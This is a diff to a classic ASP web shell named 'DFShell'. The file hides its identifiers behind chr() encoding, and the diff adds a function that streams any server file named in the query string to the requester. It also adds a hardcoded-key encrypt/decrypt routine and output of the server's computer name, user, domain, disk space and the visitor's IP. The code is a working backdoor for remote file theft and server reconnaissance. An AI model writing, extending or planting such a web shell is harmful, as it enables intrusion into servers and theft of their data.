@@ -1,6 +1,4 @@
-<!DOCTYPE html>
-<html>
-   <body>
+
 <%
 Dim Scd : Scd = (chr(83)&chr(99)&chr(114)&chr(105)&chr(112)&chr(116)&chr(105)&chr(110)&chr(103)&chr(46)&chr(68)&chr(105)&chr(99)&chr(116)&chr(105)&chr(111)&chr(110)&chr(97)&chr(114)&chr(121))
 Dim dfsact : dfsact = (chr(100)&chr(102)&chr(115)&chr(97)&chr(99)&chr(116)&chr(105)&chr(111)&chr(110))
@@ -16,8 +14,86 @@ Dim laddr : laddr = (chr(76)&chr(79)&chr(67)&chr(65)&chr(76)&chr(95)&chr(65)&chr
 Dim appth : appth = (chr(65)&chr(80)&chr(80)&chr(76)&chr(95)&chr(80)&chr(72)&chr(89)&chr(83)&chr(73)&chr(67)&chr(65)&chr(76)&chr(95)&chr(80)&chr(65)&chr(84)&chr(72))
 Dim ptif : ptif = (chr(80)&chr(65)&chr(84)&chr(72)&chr(95)&chr(73)&chr(78)&chr(70)&chr(79))
 Dim scnm : scnm = (chr(83)&chr(67)&chr(82)&chr(73)&chr(80)&chr(84)&chr(95)&chr(78)&chr(65)&chr(77)&chr(69))
+Dim rmaddr : rmaddr = (chr(82)&chr(69)&chr(77)&chr(79)&chr(84)&chr(69)&chr(95)&chr(65)&chr(68)&chr(68)&chr(82))
 
 Class DFShell
+    Private cryptkey,g_KeyLen,fileSaveState
+
+	Private Sub Class_Initialize()
+		fileSaveState 	= False
+		g_KeyLen 		= 512
+		cryptkey 		= "y$_=#%$Af{a}fEJHWF&$&rthyH#SDfSHG#YLO:{\/@ASDBMI~d<>?"
+
+	End Sub
+
+	Private Function URLDecode4Encrypt(sConvert)
+		Dim aSplit
+		Dim sOutput
+		Dim I
+		If IsNull(sConvert) Then
+			URLDecode4Encrypt = ""
+			Exit Function
+		End If
+
+		sOutput=sConvert
+		aSplit = Split(sOutput, "%")
+		If IsArray(aSplit) Then
+			sOutput = aSplit(0)
+			For I = 0 to UBound(aSplit) - 1
+				sOutput = sOutput &  Chr("&H" & Left(aSplit(i + 1), 2)) & Right(aSplit(i + 1), Len(aSplit(i + 1)) - 2)
+			Next
+		End If
+		URLDecode4Encrypt = sOutput
+	End Function
+
+    Public function DFSDownload(strPath,strFile)
+
+        Response.Buffer = False
+        Set objStream = Server.CreateObject("ADODB.Stream")
+        objStream.Type = 1
+        objStream.Open
+        objStream.LoadFromFile(strPath & strFile)
+        Response.ContentType = "application/octet-stream"
+        Response.Addheader "Content-Disposition", "attachment; filename=" & strFile
+        Response.BinaryWrite objStream.Read
+        objStream.Close
+        Set objStream = Nothing
+
+    End function
+
+
+	Public function Encrypt(inputstr)
+		Dim i,x
+		outputstr=""
+		cc=0
+		for i=1 to len(inputstr)
+			x=asc(mid(inputstr,i,1))
+			x=x-48
+			if x<0 then x=x+255
+			x=x+asc(mid(cryptkey,cc+1,1))
+			if x>255 then x=x-255
+			outputstr=outputstr&chr(x)
+			cc=(cc+1) mod len(cryptkey)
+		next
+		Encrypt = server.urlencode(replace(outputstr,"%","%25"))
+	End function
+
+	Public function Decrypt(byval inputstr)
+		Dim i,x
+		inputstr=URLDecode4Encrypt(inputstr)
+		outputstr=""
+		cc=0
+		for i=1 to len(inputstr)
+			x=asc(mid(inputstr,i,1))
+			x=x-asc(mid(cryptkey,cc+1,1))
+			if x<0 then x=x+255
+			x=x+48
+			if x>255 then x=x-255
+			outputstr=outputstr&chr(x)
+			cc=(cc+1) mod len(cryptkey)
+		next
+		Decrypt = outputstr
+	End function
 
     Public function ereg_replace(strOriginalString, strPattern, strReplacement)
         dim objRegExp : set objRegExp = new RegExp
@@ -98,8 +174,6 @@ Set DFSnet = CreateObject(Scn)
 Set DFSfo = CreateObject(Sfo)
 Set shell = new DFShell
 
-Response.Buffer = true
-
 dftm = request.querystring(dfsact)
 dfsf = request.querystring("dfsf")
 dfsp = request.querystring("dfsp")
@@ -115,9 +189,22 @@ While pos2 <> 0
 	End If
 Wend
 
-response.write("<br>Server : "&Request.ServerVariables(srvn)&" | Port : "&Request.ServerVariables(srvp))
+    If request("dfsaction") = "download" Then
+        call shell.DFSDownload(dfsf,dfsp)
+    Else
+%>
+
+<!DOCTYPE html>
+<html>
+<body>
+<%
+
+
+Response.Buffer = true
+
+response.write("<br>Server : "&Request.ServerVariables(srvn)&" | Port : "&Request.ServerVariables(srvp)&" | Server Address : "&Request.ServerVariables(laddr))
 response.write("<br>CompName : " & DFSnet.ComputerName & " | User : " & DFSnet.UserName & " | Domain : "&DFSnet.UserDomain)
-response.write("<br>Server Software : "&Request.ServerVariables(srvs)&" | Server Address : "&Request.ServerVariables(laddr))
+response.write("<br>Server Software : "&Request.ServerVariables(srvs)&" | Your IP : "&Request.ServerVariables(rmaddr))
 response.write("<br>Current Access: "&dpth1&" | Current Folder: "&Left(dpth1,pos))
 response.write("<br>Document Root : "&Request.ServerVariables(appth))
 response.write(" | Disk Available: ")
@@ -209,7 +296,7 @@ End If
 <pre>
 <%
     Dim Xt1Y0p,X5pl1
-    Xt1Y0p = "S,C,R,I,P,T,_,N,A,M,E"
+    Xt1Y0p = "R,E,M,O,T,E,_,A,D,D,R"
     X5pl1 = split(Xt1Y0p,",")
     For i=0 to uBound(X5pl1)
         For j=0 to 255
@@ -218,7 +305,11 @@ End If
             End if
         Next
     Next
-
+    'Dim xxx : xxx = shell.Encrypt("foldah")
+    'response.write(shell.Decrypt(xxx))
 %>
     </body>
 </html>
+<%
+End if
+%>
